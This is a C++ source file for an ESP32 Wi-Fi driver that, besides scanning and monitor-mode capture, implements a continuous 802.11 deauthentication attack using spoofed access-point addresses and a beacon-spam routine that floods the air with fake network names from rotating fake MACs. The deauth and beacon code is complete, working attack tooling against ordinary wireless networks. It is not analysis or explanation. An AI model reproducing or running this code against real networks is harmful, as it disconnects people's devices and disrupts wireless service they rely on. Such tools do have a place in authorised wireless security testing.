#include "nema/esp32/esp32_wifi_radio.h"
#include "nema/runtime.h"
#include "nema/log/logger.h"
#include <esp_wifi.h>
#include <cstring>
#include <cstdio>

namespace nema {

// ── Deauth frame template (802.11 Management, Subtype=12 Deauthentication) ──
// Offsets 4..9 = DA (broadcast or target), 10..15 = SA (spoofed BSSID),
// 16..21 = BSSID, 24..25 = reason (7 = class 3 frame from nonassociated STA).
static const uint8_t kDeauthTemplate[26] = {
    0xC0, 0x00,                          // Frame control
    0x00, 0x00,                          // Duration
    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,  // DA: broadcast (fill per-target at runtime)
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  // SA: spoofed BSSID (filled at runtime)
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  // BSSID (same as SA)
    0x00, 0x00,                          // Sequence control
    0x07, 0x00,                          // Reason: class 3 frame from nonassociated
};

// ── Beacon frame template (minimal, 802.11 Management, Subtype=8) ────────────
// Bytes 10..11 = frame body offset; SSID IE at byte 36.
static const uint8_t kBeaconTemplate[38] = {
    0x80, 0x00,                          // Frame control: beacon
    0xFF, 0xFF,                          // Duration
    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,  // DA: broadcast
    0xDE, 0xAD, 0xBE, 0xEF, 0xCA, 0xFE, // SA (filled at runtime)
    0xDE, 0xAD, 0xBE, 0xEF, 0xCA, 0xFE, // BSSID (same as SA)
    0x00, 0x00,                          // Sequence control
    // Fixed params (8 bytes): timestamp 0, interval 100TU, caps 0x0401 (ESS+Short Slot)
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x64, 0x00,
    0x01, 0x04,
    // SSID IE tag+len (filled at runtime), up to 32 bytes of SSID follow
    0x00, 0x00,
};

// ── Monitor mode: promiscuous RX ──────────────────────────────────────────────
// The promiscuous callback runs outside the WASM sandbox; it pushes raw frames
// into the base-class bounded ring via pushFrame(). Full ring → frame dropped.
static Esp32WifiRadio* s_radio = nullptr;

static void promiscRxCb(void* buf, wifi_promiscuous_pkt_type_t /*type*/) {
    if (!s_radio) return;
    auto* pkt = static_cast<wifi_promiscuous_pkt_t*>(buf);
    s_radio->pushFrame(pkt->payload, pkt->rx_ctrl.sig_len);
}

// ──────────────────────────────────────────────────────────────────────────────

void Esp32WifiRadio::init(Runtime& rt) {
    rt_ = &rt;
    loopThread_.start({"RadioLoop", 4096, 5, 0}, loopEntry, this);
}

void Esp32WifiRadio::stop() {
    monitorClose();   // disable promiscuous before thread exits
    doDeauth_ = false;
    doBeacon_ = false;
    loopThread_.requestStop();
    loopThread_.join();
}

bool Esp32WifiRadio::parseBssid(std::string_view s, uint8_t out[6]) {
    unsigned int b[6] = {};
    if (std::sscanf(s.data(), "%02x:%02x:%02x:%02x:%02x:%02x",
                    &b[0], &b[1], &b[2], &b[3], &b[4], &b[5]) != 6) return false;
    for (int i = 0; i < 6; ++i) out[i] = static_cast<uint8_t>(b[i]);
    return true;
}

std::vector<RadioScanResult> Esp32WifiRadio::scan() {
    // esp_wifi_scan_start with block=true (safe from TaskRunner worker thread).
    wifi_scan_config_t cfg{};
    cfg.scan_type     = WIFI_SCAN_TYPE_ACTIVE;
    cfg.scan_time.active.min = 100;
    cfg.scan_time.active.max = 300;

    esp_err_t err = esp_wifi_scan_start(&cfg, /*block=*/true);
    if (err != ESP_OK) return {};

    uint16_t count = 0;
    esp_wifi_scan_get_ap_num(&count);
    if (count == 0) return {};

    std::vector<wifi_ap_record_t> records(count);
    esp_wifi_scan_get_ap_records(&count, records.data());

    std::vector<RadioScanResult> out;
    out.reserve(count);
    for (const auto& r : records) {
        RadioScanResult res{};
        std::snprintf(res.bssid, sizeof(res.bssid),
                      "%02X:%02X:%02X:%02X:%02X:%02X",
                      r.bssid[0], r.bssid[1], r.bssid[2],
                      r.bssid[3], r.bssid[4], r.bssid[5]);
        std::strncpy(res.ssid, reinterpret_cast<const char*>(r.ssid), sizeof(res.ssid) - 1);
        res.channel = r.primary;
        res.rssi    = static_cast<int8_t>(r.rssi);
        const char* auth = "open";
        if (r.authmode >= WIFI_AUTH_WPA3_PSK)       auth = "wpa3";
        else if (r.authmode >= WIFI_AUTH_WPA2_PSK)  auth = "wpa2";
        else if (r.authmode >= WIFI_AUTH_WPA_PSK)   auth = "wpa";
        std::strncpy(res.auth, auth, sizeof(res.auth) - 1);
        out.push_back(res);
    }
    return out;
}

bool Esp32WifiRadio::monitorOpen(uint8_t ch) {
    s_radio = this;
    esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE);
    esp_wifi_set_promiscuous_rx_cb(promiscRxCb);
    esp_wifi_set_promiscuous(true);
    return true;
}

void Esp32WifiRadio::monitorClose() {
    esp_wifi_set_promiscuous(false);
    esp_wifi_set_promiscuous_rx_cb(nullptr);
    s_radio = nullptr;
}

bool Esp32WifiRadio::inject(uint8_t ch, const uint8_t* frame, size_t len) {
    if (!frame || len == 0 || len > 2500) return false;
    esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE);
    return esp_wifi_80211_tx(WIFI_IF_STA, frame, static_cast<int>(len), false) == ESP_OK;
}

bool Esp32WifiRadio::deauthStart(std::string_view bssid, uint8_t channel) {
    std::lock_guard<std::mutex> g(mu_);
    if (!parseBssid(bssid, deauthBssid_)) return false;
    deauthChannel_ = channel;
    doBeacon_      = false;
    doDeauth_      = true;
    return true;
}

bool Esp32WifiRadio::deauthStop() {
    doDeauth_ = false;
    return true;
}

bool Esp32WifiRadio::beaconSpamStart(const std::vector<std::string>& ssids) {
    std::lock_guard<std::mutex> g(mu_);
    beaconSsids_ = ssids;
    doDeauth_    = false;
    doBeacon_    = true;
    return true;
}

bool Esp32WifiRadio::beaconSpamStop() {
    doBeacon_ = false;
    return true;
}

void Esp32WifiRadio::loopEntry(void* self) {
    auto* r = static_cast<Esp32WifiRadio*>(self);
    while (!r->loopThread_.shouldStop()) {
        if      (r->doDeauth_) r->deauthLoop();
        else if (r->doBeacon_) r->beaconLoop();
        else    Thread::sleepMs(10);
    }
}

void Esp32WifiRadio::deauthLoop() {
    uint8_t frame[26];
    uint8_t bssid[6];
    uint8_t ch;
    {
        std::lock_guard<std::mutex> g(mu_);
        std::memcpy(bssid, deauthBssid_, 6);
        ch = deauthChannel_;
    }

    std::memcpy(frame, kDeauthTemplate, sizeof(frame));
    std::memcpy(frame + 4,  bssid, 6);  // DA (broadcast already; override for unicast)
    std::memcpy(frame + 10, bssid, 6);  // SA = spoofed BSSID
    std::memcpy(frame + 16, bssid, 6);  // BSSID

    esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE);
    esp_wifi_80211_tx(WIFI_IF_STA, frame, sizeof(frame), false);

    char buf[64];
    std::snprintf(buf, sizeof(buf),
                  "{\"bssid\":\"%02X:%02X:%02X:%02X:%02X:%02X\",\"channel\":%d}",
                  bssid[0], bssid[1], bssid[2], bssid[3], bssid[4], bssid[5], (int)ch);
    pushEvent("deauth_sent", buf);

    Thread::sleepMs(100);
}

void Esp32WifiRadio::beaconLoop() {
    std::vector<std::string> ssids;
    {
        std::lock_guard<std::mutex> g(mu_);
        ssids = beaconSsids_;
    }

    // Fake MAC: rotate through 0xDE:AD:BE:EF:CA:XX
    static uint8_t fakeMac[6] = {0xDE, 0xAD, 0xBE, 0xEF, 0xCA, 0x00};

    for (size_t i = 0; i < ssids.size(); ++i) {
        if (loopThread_.shouldStop() || !doBeacon_) break;
        fakeMac[5] = static_cast<uint8_t>(i & 0xFF);

        const std::string& ssid = ssids[i];
        size_t ssidLen = ssid.size() > 32 ? 32 : ssid.size();

        // Build beacon: template + SSID IE (tag 0x00, len, ssid bytes)
        std::vector<uint8_t> beacon(kBeaconTemplate,
                                    kBeaconTemplate + sizeof(kBeaconTemplate));
        std::memcpy(beacon.data() + 10, fakeMac, 6);
        std::memcpy(beacon.data() + 16, fakeMac, 6);
        beacon[36] = 0x00;                        // SSID IE tag
        beacon[37] = static_cast<uint8_t>(ssidLen);
        for (size_t j = 0; j < ssidLen; ++j)
            beacon.push_back(static_cast<uint8_t>(ssid[j]));

        esp_wifi_80211_tx(WIFI_IF_STA,
                          beacon.data(), static_cast<int>(beacon.size()), false);

        char buf[64];
        std::snprintf(buf, sizeof(buf), "{\"ssid\":\"%s\"}", ssid.c_str());
        pushEvent("beacon_sent", buf);
    }
    Thread::sleepMs(100);
}

} // namespace nema
